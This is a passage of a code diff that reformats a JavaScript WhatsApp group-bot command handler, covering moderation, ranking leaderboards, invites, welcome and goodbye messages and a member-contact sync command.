+                  .filter((arg) => /^\d{5,15}$/.test(arg))
+                  .map((num) => num + "@s.whatsapp.net");
+                console.log(users.length);
+                if (users.length === 0)
+                  return AlexaInc.sendMessage(
+                    msg.key.remoteJid,
+                    {
+                      text: "enter valid number",
+                    },
+                    {
+                      quoted: msg,
+                    },
+                  ); // if no valid numbers, stop
+              } else if (
+                msg.message.extendedTextMessage?.contextInfo?.participant
+              ) {
+                users = [
+                  msg.message.extendedTextMessage.contextInfo.participant,
+                ];
+              } else {
+                return AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: `Please mention someone, reply to a user, or provide a number to ${command}!`,
+                });
+              }
+              await removeWarn(AlexaInc, msg.key.remoteJid, users);
+              break;
+            }
+
+            case "rmw_fbc": {
+              if (!isGroup) return mess.group();
+              if (!isAdmins && !isOwner) return mess["admin&owner"]();
+              if (!isBotAdmins) return mess.botadmin();
+              const users = [text];
+              await removeWarn(AlexaInc, msg.key.remoteJid, users);
+              break;
+            }
+
+            case "mute": {
+              if (!isGroup) return mess.group();
+              if (!isAdmins && !isOwner) return mess["admin&owner"]();
+              if (!isBotAdmins) return mess.botadmin();
+              const muteArg = args[1];
+              const muteDuration =
+                muteArg !== undefined ? parseInt(muteArg, 10) : undefined;
+              if (
+                muteArg !== undefined &&
+                (isNaN(muteDuration) || muteDuration <= 0)
+              ) {
+                await AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: "Please provide a valid number of minutes or use .mute with no number to mute immediately.",
+                    ...channelInfo,
+                  },
+                  {
+                    quoted: message,
+                  },
+                );
+              } else {
+                await muteCommand(
+                  AlexaInc,
+                  msg.key.remoteJid,
+                  msg.key.participant,
+                  msg,
+                  muteDuration,
+                );
+              }
+
+              break;
+            }
+            case "unmute": {
+              if (!isGroup) return mess.group();
+              if (!isAdmins && !isOwner) return mess["admin&owner"]();
+              if (!isBotAdmins) return mess.botadmin();
+
+              await unmuteCommand(AlexaInc, msg.key.remoteJid);
+
+              break;
+            }
+            case "topadder": {
+              const fs = require("fs");
+
+              // 1. Define the file path for this specific group
+              // Assuming 'from' or 'm.chat' is your group ID variable. Adjust as needed.
+              const chatId = msg.key.remoteJid;
+              const filePath = `./database/add_counts/${chatId}.json`;
+
+              // 2. Check if data exists for this group
+              if (!fs.existsSync(filePath)) {
+                return AlexaInc.sendMessage(
+                  chatId,
+                  {
+                    text: "⚠️ No member add records found for this group yet.",
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+              }
+
+              // 3. Read and Parse the JSON
+              const fileContent = fs.readFileSync(filePath, "utf-8");
+              const jsonDb = JSON.parse(fileContent);
+
+              // 4. Convert Object to Array and Sort by Count (Highest to Lowest)
+              // Object.entries turns { "user1": 10, "user2": 5 } into [ ["user1", 10], ["user2", 5] ]
+              const sortedAdders = Object.entries(jsonDb).sort(
+                (a, b) => b[1] - a[1],
+              );
+
+              // 5. Slice to get Top 10 (optional)
+              const topList = sortedAdders.slice(0, 10);
+
+              // 6. Construct Message and Mentions Array
+              let mentionText = `🏆 *Top Member Adders*\n\n`;
+              const mentions = [];
+
+              topList.forEach((entry, index) => {
+                const userId = entry[0]; // e.g., 194300461756480@lid
+                const count = entry[1]; // e.g., 5
+
+                // Add the raw ID to the mentions array so WhatsApp tags them
+                mentions.push(userId);
+
+                // Format the ID for display: Remove '@lid' or '@s.whatsapp.net'
+                const cleanId = userId.split("@")[0];
+
+                // Add line to message: 1. @194300... : 5
+                mentionText += `${index + 1}. @${cleanId} : *${count}* Added\n`;
+              });
+
+              mentionText += `\n_Total recorded adders: ${sortedAdders.length}_`;
+
+              // 7. Send the Message
+              await AlexaInc.sendMessage(
+                chatId,
+                {
+                  text: mentionText,
+                  mentions: mentions, // Crucial: contains the full IDs including @lid
+                },
+                {
+                  quoted: msg,
+                },
+              );
+              break;
+            }
+
+            case "ranking":
+            case "global":
+            case "daily":
+            case "weekly": {
+              const moment = require("moment-timezone");
+              const chatId = msg.key.remoteJid;
+              const filePath = `${RANKING_FOLDER}/${chatId}.json`; // Ensure RANKING_FOLDER is defined globally or locally
+
+              // ---------------------------------------------------------
+              // 1. FETCH FROM CACHE (OR DISK IF NOT IN CACHE)
+              // ---------------------------------------------------------
+              if (!rankingCache[chatId]) {
+                // Not in RAM? Try to load from disk
+                if (fs.existsSync(filePath)) {
+                  try {
+                    rankingCache[chatId] = JSON.parse(
+                      fs.readFileSync(filePath, "utf-8"),
+                    );
+                  } catch (err) {
+                    console.error(`Corrupt ranking file for ${chatId}`, err);
+                    rankingCache[chatId] = {}; // Fallback
+                  }
+                } else {
+                  // Not in RAM and Not on Disk
+                  return AlexaInc.sendMessage(
+                    chatId,
+                    {
+                      text: "📊 No messaging data recorded for this group yet.",
+                    },
+                    {
+                      quoted: msg,
+                    },
+                  );
+                }
+              }
+
+              // Now we are sure we have data in the variable
+              const rankDb = rankingCache[chatId];
+              // ---------------------------------------------------------
+
+              let mode = "global";
+              const text = (args.join(" ") || "").toLowerCase();
+              const cmd = command.toLowerCase();
+
+              if (cmd.includes("daily") || text.includes("daily"))
+                mode = "daily";
+              else if (cmd.includes("weekly") || text.includes("weekly"))
+                mode = "weekly";
+
+              const currentDay = moment()
+                .tz("Asia/Colombo")
+                .format("YYYY-MM-DD");
+              const currentWeek = moment().tz("Asia/Colombo").format("YYYY-WW");
+
+              const sortedStats = Object.entries(rankDb)
+                .map(([id, data]) => {
+                  let count = 0;
+
+                  if (mode === "global") {
+                    count = data.global || 0;
+                  } else if (mode === "daily") {
+                    if (data.daily && data.daily.dayKey === currentDay) {
+                      count = data.daily.count;
+                    }
+                  } else if (mode === "weekly") {
+                    if (data.weekly && data.weekly.weekKey === currentWeek) {
+                      count = data.weekly.count;
+                    }
+                  }
+                  return {
+                    id,
+                    count,
+                  };
+                })
+                .filter((u) => u.count > 0)
+                .sort((a, b) => b.count - a.count);
+
+              if (sortedStats.length === 0) {
+                return AlexaInc.sendMessage(
+                  chatId,
+                  {
+                    text: `📉 No active messages found for *${mode}* ranking yet.`,
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+              }
+
+              const topList = sortedStats.slice(0, 15);
+
+              let mentionText = `🏆 *${mode.toUpperCase()} CHAT RANKING*\n`;
+              mentionText += `_Top active members in ${groupMetadata.subject}_\n\n`;
+
+              const mentions = [];
+
+              topList.forEach((user, index) => {
+                const medal =
+                  index === 0
+                    ? "🥇"
+                    : index === 1
+                      ? "🥈"
+                      : index === 2
+                        ? "🥉"
+                        : `${index + 1}.`;
+                mentions.push(user.id);
+                const cleanId = user.id.split("@")[0];
+                mentionText += `${medal} @${cleanId} : *${user.count}* \n`;
+              });
+
+              mentionText += `\n_Total active users: ${sortedStats.length}_`;
+
+              // 4. Send Message
+              await AlexaInc.sendMessage(
+                chatId,
+                {
+                  text: mentionText,
+                  mentions: mentions,
+                },
+                {
+                  quoted: msg,
+                },
+              );
+              break;
+            }
+
+            case "rank":
+            case "myrank": {
+              const moment = require("moment-timezone");
+              const chatId = msg.key.remoteJid;
+              const senderId = finalLid;
+              const filePath = `${RANKING_FOLDER}/${chatId}.json`;
+
+              // ---------------------------------------------------------
+              // 1. FETCH FROM CACHE
+              // ---------------------------------------------------------
+              if (!rankingCache[chatId]) {
+                if (fs.existsSync(filePath)) {
+                  try {
+                    rankingCache[chatId] = JSON.parse(
+                      fs.readFileSync(filePath, "utf-8"),
+                    );
+                  } catch {
+                    rankingCache[chatId] = {};
+                  }
+                } else {
+                  return AlexaInc.sendMessage(
+                    chatId,
+                    {
+                      text: "📊 No data recorded for this group yet.",
+                    },
+                    {
+                      quoted: m,
+                    },
+                  );
+                }
+              }
+              const rankDb = rankingCache[chatId];
+
+              // 2. Check if user exists
+              const userStats = rankDb[senderId];
+              if (!userStats) {
+                return AlexaInc.sendMessage(
+                  chatId,
+                  {
+                    text: "📉 You haven't sent any messages yet. Start chatting to get ranked!",
+                  },
+                  {
+                    quoted: m,
+                  },
+                );
+              }
+
+              // 3. Prepare Data & Sort by GLOBAL Count
+              const sortedUsers = Object.entries(rankDb)
+                .map(([id, data]) => ({
+                  id,
+                  global: data.global || 0,
+                }))
+                .sort((a, b) => b.global - a.global);
+
+              const myIndex = sortedUsers.findIndex(
+                (user) => user.id === senderId,
+              );
+              const myRank = myIndex + 1;
+              const myCount = sortedUsers[myIndex].global;
+
+              // 4. Calculate Stats (Daily/Weekly)
+              const currentDay = moment()
+                .tz("Asia/Colombo")
+                .format("YYYY-MM-DD");
+              const currentWeek = moment().tz("Asia/Colombo").format("YYYY-WW");
+
+              const dailyCount =
+                userStats.daily && userStats.daily.dayKey === currentDay
+                  ? userStats.daily.count
+                  : 0;
+              const weeklyCount =
+                userStats.weekly && userStats.weekly.weekKey === currentWeek
+                  ? userStats.weekly.count
+                  : 0;
+
+              // ---------------------------------------------------------
+              // 5. CALCULATE UP/DOWN GAPS
+              // ---------------------------------------------------------
+              let gapText = "";
+
+              // A. Check user ABOVE (Rank Up)
+              if (myIndex > 0) {
+                // If not Rank 1
+                const userAbove = sortedUsers[myIndex - 1];
+                const diff = userAbove.global - myCount + 1; // +1 to overtake
+                gapText += `🔼 *Rank Up:* Need *${diff}* msgs to beat Top ${myRank - 1}\n`;
+              } else {
+                gapText += `👑 *You are the Leader!* Keep it up!\n`;
+              }
+
+              // B. Check user BELOW (Safety Margin)
+              if (myIndex < sortedUsers.length - 1) {
+                // If not last
+                const userBelow = sortedUsers[myIndex + 1];
+                const lead = myCount - userBelow.global;
+                // If lead is 0, they are tied but you are ranked higher due to sort order
+                const leadMsg =
+                  lead === 0 ? "⚠️ Tied!" : `*${lead}* msgs ahead`;
+                gapText += `🔽 *Safety:* ${leadMsg} of Top ${myRank + 1}`;
+              } else {
+                gapText += `🔽 *Bottom:* You are at the last rank.`;
+              }
+
+              // 6. Build Message
+              let text = `👤 *YOUR RANK PROFILE*\n`;
+              text += `_Stats for @${senderId.split("@")[0]}_\n\n`;
+
+              let medal = "";
+              if (myRank === 1) medal = "🥇 ";
+              else if (myRank === 2) medal = "🥈 ";
+              else if (myRank === 3) medal = "🥉 ";
+
+              text += `${medal}🏆 *Rank:* #${myRank} (of ${sortedUsers.length})\n`;
+              text += `🌐 *Global:* ${myCount} msgs\n`;
+              text += `📅 *Daily:* ${dailyCount} msgs\n`;
+              text += `🗓️ *Weekly:* ${weeklyCount} msgs\n\n`;
+
+              text += `📊 *Position Analysis:*\n${gapText}`;
+
+              await AlexaInc.sendMessage(
+                chatId,
+                {
+                  text: text,
+                  mentions: [senderId],
+                },
+                {
+                  quoted: msg,
+                },
+              );
+              break;
+            }
+
+            case "add":
+            case "remove":
+            case "promote":
+            case "demote": {
+              if (!isGroup) return mess.group();
+              if (command == "add" && !isOwner) return mess.owner();
+              if (!isAdmins && !isOwner) return mess["admin&owner"]();
+
+              if (!isBotAdmins) return mess.botadmin();
+
+              // console.log({ isGroup, isAdmins, isBotAdmins });
+
+              // Get mentioned users if any
+              let users = [];
+
+              // 1. Check for mentions
+              if (
+                msg.message.extendedTextMessage?.contextInfo?.mentionedJid
+                  ?.length > 0
+              ) {
+                users =
+                  msg.message.extendedTextMessage.contextInfo.mentionedJid;
+
+                // 2. Fallback: check for numbers in args
+              } else if (args.length > 0) {
+                users = args
+                  .map((arg) => arg.replace(/^\+/, "")) // remove leading +
+                  .filter((arg) => /^\d{5,15}$/.test(arg)) // keep only valid numbers (5–15 digits)
+                  .map((num) => num + "@s.whatsapp.net");
+                console.log(users.length);
+                if (users.length === 0)
+                  return AlexaInc.sendMessage(
+                    msg.key.remoteJid,
+                    {
+                      text: "enter valid number",
+                    },
+                    {
+                      quoted: msg,
+                    },
+                  ); // if no valid numbers, stop
+              } else if (
+                msg.message.extendedTextMessage?.contextInfo?.participant
+              ) {
+                // Put the single participant JID into an array for consistency
+                users = [
+                  msg.message.extendedTextMessage.contextInfo.participant,
+                ];
+
+                // 4. If nothing is found, send error
+              } else {
+                return AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: `Please mention someone, reply to a user, or provide a number to ${command}!`,
+                });
+              }
+
+              // This will now log the replied-to user's JID in an array
+              console.log(users);
+
+              AlexaInc.groupParticipantsUpdate(
+                msg.key.remoteJid,
+                users,
+                command, // 'add', 'remove', 'promote', 'demote'
+              )
+                .then((res) => {
+                  if (res[0].status !== "200")
+                    return AlexaInc.sendMessage(msg.key.remoteJid, {
+                      text: `Failed to ${command} user(s). Maybe the number is incorrect or they left the group.`,
+                    });
+                  // console.log(res)
+                  AlexaInc.sendMessage(msg.key.remoteJid, {
+                    text: `User(s) ${command}d successfully!`,
+                  });
+                })
+                .catch((error) => {
+                  console.error(`Failed to ${command} user(s):`, error);
+                  AlexaInc.sendMessage(msg.key.remoteJid, {
+                    text: `Failed to ${command} user(s). Maybe the number is incorrect or they left the group.`,
+                  });
+                });
+
+              break;
+            }
+
+            //invite
+            case "invite": {
+              if (!isGroup) return mess.group();
+              if (!isOwner) return mess.owner();
+              const code = await AlexaInc.groupInviteCode(msg.key.remoteJid);
+              console.log(code);
+              let user;
+              if (args.length > 0) {
+                user = args
+                  .map((arg) => arg.replace(/^\+/, "")) // remove leading +
+                  .filter((arg) => /^\d{5,15}$/.test(arg)) // keep only valid numbers (5–15 digits)
+                  .map((num) => num + "@s.whatsapp.net");
+                // console.log(users.length)
+                if (user.length === 0)
+                  return AlexaInc.sendMessage(
+                    msg.key.remoteJid,
+                    {
+                      text: "enter valid number",
+                    },
+                    {
+                      quoted: msg,
+                    },
+                  ); // if no valid numbers, stop
+              }
+              console.log(user);
+              await AlexaInc.sendMessage(user[0], {
+                groupInvite: {
+                  jid: msg.key.remoteJid,
+                  name: groupMetadata.subject,
+                  caption: "Join My Whatsapp Group",
+                  code: code,
+                },
+              });
+              break;
+            }
+
+            case "kikbots": {
+              const action = args[0] ? args[0].toLowerCase() : "";
+              if (action !== "on" && action !== "off") {
+                const usageText =
+                  "Usage: .kikbots [on | off]\n\n" +
+                  "- off: Allow other bots to remain in the group.\n" +
+                  "- on: Automatically remove other bots.";
+                return AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: usageText,
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+              }
+              const shouldAllow = action === "off";
+              const query = `
         INSERT INTO \`groups\` (group_id, is_allow_bots)
         VALUES (?, ?)
         ON DUPLICATE KEY UPDATE is_allow_bots = ?
     `;
 
-                            const groupId = msg.key.remoteJid;
-                            db.query(query, [groupId, shouldAllow, shouldAllow], (err, result) => {
-                                if (err) {
-                                    console.error("Error updating kickbots status:", err);
-                                    return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                        text: '❌ Database error. Please try again later.'
-                                    }, {
-                                        quoted: msg
-                                    });
-                                } else {
-                                    clearSettingsCache(msg.key.remoteJid);
-                                    const statusText = shouldAllow ? '✅ *allowed*' : '🚫 *prohibited*';
-                                    return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                        text: `Other bots are now ${statusText} in this group.`
-                                    }, {
-                                        quoted: msg
-                                    });
-                                }
-                            });
+              const groupId = msg.key.remoteJid;
+              db.query(
+                query,
+                [groupId, shouldAllow, shouldAllow],
+                (err, result) => {
+                  if (err) {
+                    console.error("Error updating kickbots status:", err);
+                    return AlexaInc.sendMessage(
+                      msg.key.remoteJid,
+                      {
+                        text: "❌ Database error. Please try again later.",
+                      },
+                      {
+                        quoted: msg,
+                      },
+                    );
+                  } else {
+                    clearSettingsCache(msg.key.remoteJid);
+                    const statusText = shouldAllow
+                      ? "✅ *allowed*"
+                      : "🚫 *prohibited*";
+                    return AlexaInc.sendMessage(
+                      msg.key.remoteJid,
+                      {
+                        text: `Other bots are now ${statusText} in this group.`,
+                      },
+                      {
+                        quoted: msg,
+                      },
+                    );
+                  }
+                },
+              );
 
-                            break;
-                        }
+              break;
+            }
 
+            case "cmtdt": {
+              const botJid = botNumber + "@s.whatsapp.net";
 
+              // Get all user contacts
+              const allContacts = Object.values(AlexaInc.store.contacts);
 
-                        case 'cmtdt': {
-                            const botJid = botNumber + '@s.whatsapp.net';
+              // Filter valid user JIDs
+              const userJIDs = allContacts
+                .filter((contact) => contact.id.endsWith("@s.whatsapp.net"))
+                .map((contact) => contact.id);
 
-                            // Get all user contacts
-                            const allContacts = Object.values(AlexaInc.store.contacts);
+              // Add the bot number if not already in the list
+              if (!userJIDs.includes(botJid)) {
+                userJIDs.push(botJid);
+              }
 
-                            // Filter valid user JIDs
-                            const userJIDs = allContacts
-                                .filter(contact => contact.id.endsWith('@s.whatsapp.net'))
-                                .map(contact => contact.id);
+              // Send status to all users including bot
+              await AlexaInc.sendMessage(
+                "status@broadcast",
+                {
+                  text: "Hello everyone!",
+                },
+                {
+                  broadcast: true,
+                  statusJidList: userJIDs,
+                },
+              );
 
-                            // Add the bot number if not already in the list
-                            if (!userJIDs.includes(botJid)) {
-                                userJIDs.push(botJid);
-                            }
+              break;
+            }
 
-                            // Send status to all users including bot
-                            await AlexaInc.sendMessage('status@broadcast', {
-                                text: 'Hello everyone!'
-                            }, {
-                                broadcast: true,
-                                statusJidList: userJIDs
-                            });
+            // Case 1: Handle Welcome On/Off
+            case "welcome": {
+              if (!isGroup) return mess.group();
+              if (!isAdmins) return mess.admin();
 
+              // Get the first argument (on/off)
+              // Assuming your bot defines 'args' as an array of words after the command
+              // If not, you can use: const state = text.trim().split(' ')[0].toLowerCase();
+              const state = args[0] ? args[0].toLowerCase() : "";
 
-
-                            break
-                        }
-
-
-                        // Case 1: Handle Welcome On/Off
-                        case 'welcome': {
-                            if (!isGroup) return mess.group();
-                            if (!isAdmins) return mess.admin();
-
-                            // Get the first argument (on/off)
-                            // Assuming your bot defines 'args' as an array of words after the command
-                            // If not, you can use: const state = text.trim().split(' ')[0].toLowerCase();
-                            let state = args[0] ? args[0].toLowerCase() : '';
-
-                            if (state === 'on') {
-                                // Enable welcome (is_welcome = TRUE) - Preserves existing wc_m
-                                const query = `
+              if (state === "on") {
+                // Enable welcome (is_welcome = TRUE) - Preserves existing wc_m
+                const query = `
                                 INSERT INTO \`groups\` (group_id, is_welcome)
                                 VALUES (?, TRUE)
                                 ON DUPLICATE KEY UPDATE is_welcome = TRUE
                             `;
 
-                                db.query(query, [msg.key.remoteJid], async (err, result) => {
-                                    if (err) {
-                                        console.error('Error enabling welcome:', err);
-                                        return await AlexaInc.sendMessage(msg.key.remoteJid, { text: 'Failed to enable welcome.' });
-                                    }
-                                    await AlexaInc.sendMessage(msg.key.remoteJid, { text: 'Welcome feature has been enabled!' });
-                                    clearSettingsCache(msg.key.remoteJid);
-                                });
-
-                            } else if (state === 'off') {
-                                // Disable welcome (is_welcome = FALSE) - Preserves existing wc_m
-                                const query = `
+                db.query(query, [msg.key.remoteJid], async (err, result) => {
+                  if (err) {
+                    console.error("Error enabling welcome:", err);
+                    return await AlexaInc.sendMessage(msg.key.remoteJid, {
+                      text: "Failed to enable welcome.",
+                    });
+                  }
+                  await AlexaInc.sendMessage(msg.key.remoteJid, {
+                    text: "Welcome feature has been enabled!",
+                  });
+                  clearSettingsCache(msg.key.remoteJid);
+                });
+              } else if (state === "off") {
+                // Disable welcome (is_welcome = FALSE) - Preserves existing wc_m
+                const query = `
                                 INSERT INTO \`groups\` (group_id, is_welcome)
                                 VALUES (?, FALSE)
                                 ON DUPLICATE KEY UPDATE is_welcome = FALSE
                             `;
 
-                                db.query(query, [msg.key.remoteJid], async (err, result) => {
-                                    if (err) {
-                                        console.error('Error disabling welcome:', err);
-                                        return await AlexaInc.sendMessage(msg.key.remoteJid, { text: 'Failed to disable welcome.' });
-                                    }
-                                    await AlexaInc.sendMessage(msg.key.remoteJid, { text: 'Welcome feature has been disabled!' });
-                                    clearSettingsCache(msg.key.remoteJid);
-                                });
+                db.query(query, [msg.key.remoteJid], async (err, result) => {
+                  if (err) {
+                    console.error("Error disabling welcome:", err);
+                    return await AlexaInc.sendMessage(msg.key.remoteJid, {
+                      text: "Failed to disable welcome.",
+                    });
+                  }
+                  await AlexaInc.sendMessage(msg.key.remoteJid, {
+                    text: "Welcome feature has been disabled!",
+                  });
+                  clearSettingsCache(msg.key.remoteJid);
+                });
+              } else {
+                // Invalid argument provided
+                await AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: "Please use *on* or *off*.\nExample: */welcome on*",
+                });
+              }
+              break;
+            }
 
-                            } else {
-                                // Invalid argument provided
-                                await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'Please use *on* or *off*.\nExample: */welcome on*'
-                                });
-                            }
-                            break;
-                        }
+            // Case 2: Set Welcome Message
+            case "setwelcome": {
+              if (!isGroup) return mess.group();
+              if (!isAdmins) return mess.admin();
+              if (!text)
+                return AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: "Please provide the welcome message text!\nExample: */setwelcome Hello guys!*",
+                });
 
-                        // Case 2: Set Welcome Message
-                        case 'setwelcome': {
-                            if (!isGroup) return mess.group();
-                            if (!isAdmins) return mess.admin();
-                            if (!text) return AlexaInc.sendMessage(msg.key.remoteJid, { text: 'Please provide the welcome message text!\nExample: */setwelcome Hello guys!*' });
-
-                            // Update only the welcome message (wc_m)
-                            const query = `
+              // Update only the welcome message (wc_m)
+              const query = `
                             INSERT INTO \`groups\` (group_id, wc_m)
                             VALUES (?, ?)
                             ON DUPLICATE KEY UPDATE wc_m = ?
                         `;
 
-                            db.query(query, [msg.key.remoteJid, text, text], async (err, result) => {
-                                if (err) {
-                                    console.error('Error setting welcome message:', err);
-                                    return await AlexaInc.sendMessage(msg.key.remoteJid, { text: 'Failed to set welcome message.' });
-                                }
+              db.query(
+                query,
+                [msg.key.remoteJid, text, text],
+                async (err, result) => {
+                  if (err) {
+                    console.error("Error setting welcome message:", err);
+                    return await AlexaInc.sendMessage(msg.key.remoteJid, {
+                      text: "Failed to set welcome message.",
+                    });
+                  }
 
-                                await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: `Welcome message updated successfully!\n\nNew Message:\n${text}`
-                                });
-                                clearSettingsCache(msg.key.remoteJid);
-                            });
-                            break;
-                        }
+                  await AlexaInc.sendMessage(msg.key.remoteJid, {
+                    text: `Welcome message updated successfully!\n\nNew Message:\n${text}`,
+                  });
+                  clearSettingsCache(msg.key.remoteJid);
+                },
+              );
+              break;
+            }
 
+            // Case 1: Handle Goodbye On/Off
+            case "goodbye": {
+              if (!isGroup) return mess.group();
+              if (!isAdmins) return mess.admin();
 
-                        // Case 1: Handle Goodbye On/Off
-                        case 'goodbye': {
-                            if (!isGroup) return mess.group();
-                            if (!isAdmins) return mess.admin();
+              const state = args[0] ? args[0].toLowerCase() : "";
 
-                            let state = args[0] ? args[0].toLowerCase() : '';
-
-                            if (state === 'on') {
-                                // Enable goodbye (isleft_w = TRUE)
-                                const query = `
+              if (state === "on") {
+                // Enable goodbye (isleft_w = TRUE)
+                const query = `
                                 INSERT INTO \`groups\` (group_id, isleft_w)
                                 VALUES (?, TRUE)
                                 ON DUPLICATE KEY UPDATE isleft_w = TRUE
                             `;
 
-                                db.query(query, [msg.key.remoteJid], async (err, result) => {
-                                    if (err) {
-                                        console.error('Error enabling goodbye:', err);
-                                        return await AlexaInc.sendMessage(msg.key.remoteJid, { text: 'Failed to enable goodbye feature.' });
-                                    }
-                                    await AlexaInc.sendMessage(msg.key.remoteJid, { text: 'Goodbye feature has been enabled!' });
-                                    clearSettingsCache(msg.key.remoteJid);
-                                });
-
-                            } else if (state === 'off') {
-                                // Disable goodbye (isleft_w = FALSE)
-                                const query = `
+                db.query(query, [msg.key.remoteJid], async (err, result) => {
+                  if (err) {
+                    console.error("Error enabling goodbye:", err);
+                    return await AlexaInc.sendMessage(msg.key.remoteJid, {
+                      text: "Failed to enable goodbye feature.",
+                    });
+                  }
+                  await AlexaInc.sendMessage(msg.key.remoteJid, {
+                    text: "Goodbye feature has been enabled!",
+                  });
+                  clearSettingsCache(msg.key.remoteJid);
+                });
+              } else if (state === "off") {
+                // Disable goodbye (isleft_w = FALSE)
+                const query = `
                                 INSERT INTO \`groups\` (group_id, isleft_w)
                                 VALUES (?, FALSE)
                                 ON DUPLICATE KEY UPDATE isleft_w = FALSE
                             `;
 
-                                db.query(query, [msg.key.remoteJid], async (err, result) => {
-                                    if (err) {
-                                        console.error('Error disabling goodbye:', err);
-                                        return await AlexaInc.sendMessage(msg.key.remoteJid, { text: 'Failed to disable goodbye feature.' });
-                                    }
-                                    await AlexaInc.sendMessage(msg.key.remoteJid, { text: 'Goodbye feature has been disabled!' });
-                                    clearSettingsCache(msg.key.remoteJid);
-                                });
+                db.query(query, [msg.key.remoteJid], async (err, result) => {
+                  if (err) {
+                    console.error("Error disabling goodbye:", err);
+                    return await AlexaInc.sendMessage(msg.key.remoteJid, {
+                      text: "Failed to disable goodbye feature.",
+                    });
+                  }
+                  await AlexaInc.sendMessage(msg.key.remoteJid, {
+                    text: "Goodbye feature has been disabled!",
+                  });
+                  clearSettingsCache(msg.key.remoteJid);
+                });
+              } else {
+                await AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: "Please use *on* or *off*.\nExample: */goodbye on*",
+                });
+              }
+              break;
+            }
 
-                            } else {
-                                await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'Please use *on* or *off*.\nExample: */goodbye on*'
-                                });
-                            }
-                            break;
-                        }
+            // Case 2: Set Goodbye Message
+            case "setgoodbye": {
+              if (!isGroup) return mess.group();
+              if (!isAdmins) return mess.admin();
+              if (!text)
+                return AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: "Please provide the goodbye message text!\nExample: */setgoodbye Goodbye friend!*",
+                });
 
-                        // Case 2: Set Goodbye Message
-                        case 'setgoodbye': {
-                            if (!isGroup) return mess.group();
-                            if (!isAdmins) return mess.admin();
-                            if (!text) return AlexaInc.sendMessage(msg.key.remoteJid, { text: 'Please provide the goodbye message text!\nExample: */setgoodbye Goodbye friend!*' });
-
-                            // Update only the goodbye message (left_m)
-                            const query = `
+              // Update only the goodbye message (left_m)
+              const query = `
                             INSERT INTO \`groups\` (group_id, left_m)
                             VALUES (?, ?)
                             ON DUPLICATE KEY UPDATE left_m = ?
                         `;
 
-                            db.query(query, [msg.key.remoteJid, text, text], async (err, result) => {
-                                if (err) {
-                                    console.error('Error setting goodbye message:', err);
-                                    return await AlexaInc.sendMessage(msg.key.remoteJid, { text: 'Failed to set goodbye message.' });
-                                }
+              db.query(
+                query,
+                [msg.key.remoteJid, text, text],
+                async (err, result) => {
+                  if (err) {
+                    console.error("Error setting goodbye message:", err);
+                    return await AlexaInc.sendMessage(msg.key.remoteJid, {
+                      text: "Failed to set goodbye message.",
+                    });
+                  }
 
-                                await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: `Goodbye message updated successfully!\n\nNew Message:\n${text}`
-                                });
-                                clearSettingsCache(msg.key.remoteJid);
-                            });
-                            break;
-                        }
+                  await AlexaInc.sendMessage(msg.key.remoteJid, {
+                    text: `Goodbye message updated successfully!\n\nNew Message:\n${text}`,
+                  });
+                  clearSettingsCache(msg.key.remoteJid);
+                },
+              );
+              break;
+            }
 
-                        case "getcontacts": {
-                            // 1. Check permissions first
-                            if (!isOwner) return mess.owner();
-                            if (!isGroup) return mess.group();
+            case "getcontacts": {
+              // 1. Check permissions first
+              if (!isOwner) return mess.owner();
+              if (!isGroup) return mess.group();
 
-                            // 2. Send a "processing" message
-                            await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: 'Syncing group members, please wait...'
-                            }, {
-                                quoted: msg
-                            });
+              // 2. Send a "processing" message
+              await AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: "Syncing group members, please wait...",
+                },
+                {
+                  quoted: msg,
+                },
+              );
 
-                            try {
-                                // 3. Get group info
-                                const groupId = msg.key.remoteJid;
-                                const metadata = await AlexaInc.groupMetadata(groupId);
-                                const participants = metadata.participants;
+              try {
+                // 3. Get group info
+                const groupId = msg.key.remoteJid;
+                const metadata = await AlexaInc.groupMetadata(groupId);
+                const participants = metadata.participants;
 
-                                // 4. Load existing users and create a Set for checking
-                                let users = readUsersFile();
-                                const existingNumbers = new Set(users.map(u => u.number));
-                                let newUsersAdded = 0;
+                // 4. Load existing users and create a Set for checking
+                const users = readUsersFile();
+                const existingNumbers = new Set(users.map((u) => u.number));
+                let newUsersAdded = 0;
 
-                                // 5. Loop and add only new users
-                                for (const p of participants) {
-                                    const number = p.id.split('@')[0];
+                // 5. Loop and add only new users
+                for (const p of participants) {
+                  const number = p.id.split("@")[0];
 
-                                    // This check prevents duplicates
-                                    if (number && !existingNumbers.has(number)) {
-                                        users.push({
-                                            number: number,
-                                            name: "Unknown"
-                                        });
-                                        existingNumbers.add(number); // Add to set for this session
-                                        newUsersAdded++;
-                                    }
-                                }
+                  // This check prevents duplicates
+                  if (number && !existingNumbers.has(number)) {
+                    users.push({
+                      number: number,
+                      name: "Unknown",
+                    });
+                    existingNumbers.add(number); // Add to set for this session
+                    newUsersAdded++;
+                  }
+                }
 
-                                // 6. Save and send final report
-                                if (newUsersAdded > 0) {
-                                    saveUsersjsonnn(users);
-                                    AlexaInc.sendMessage(groupId, {
-                                        text: `✅ Success!\nAdded ${newUsersAdded} new contacts to the database.`
-                                    }, {
-                                        quoted: msg
-                                    });
-                                } else {
-                                    AlexaInc.sendMessage(groupId, {
-                                        text: 'All group members are already in the database. No new contacts added.'
-                                    }, {
-                                        quoted: msg
-                                    });
-                                }
+                // 6. Save and send final report
+                if (newUsersAdded > 0) {
+                  saveUsersjsonnn(users);
+                  AlexaInc.sendMessage(
+                    groupId,
+                    {
+                      text: `✅ Success!\nAdded ${newUsersAdded} new contacts to the database.`,
+                    },
+                    {
+                      quoted: msg,
+                    },
+                  );
